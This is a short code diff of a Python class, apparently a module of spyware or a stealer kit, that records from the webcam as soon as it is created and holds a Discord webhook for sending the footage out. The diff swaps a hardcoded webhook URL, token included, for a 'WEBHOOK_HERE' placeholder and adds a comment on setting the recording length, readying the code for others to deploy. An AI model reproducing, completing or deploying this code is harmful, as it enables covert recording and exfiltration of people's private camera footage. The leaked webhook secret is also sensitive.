@@ -2,7 +2,7 @@ import os, cv2, requests, time, gofile2, datetime
 
 class WebcamRecorder():
     def __init__(self):
-        self.webhook = "https://discord.com/api/webhooks/892011430507843614/gQTiTj8kqJzopvJm_ykesWoqEtBK5MGJ8xSirxUM2bLsJxy0nYH2u9FcslPTEudrEckR"
+        self.webhook = "WEBHOOK_HERE"
         self.filename = 'video.avi'
 
         self.Recorder()
@@ -26,7 +26,7 @@ class WebcamRecorder():
 
     def Recorder(self):
         res = '720p'
-        t_end = time.time() + 2
+        t_end = time.time() + 2 #change this to the amount of time you want to record
         cap = cv2.VideoCapture(0)
         out = cv2.VideoWriter(self.filename, cv2.VideoWriter_fourcc(*'XVID'), 25, self.get_dims(cap, res))
         while time.time() < t_end:
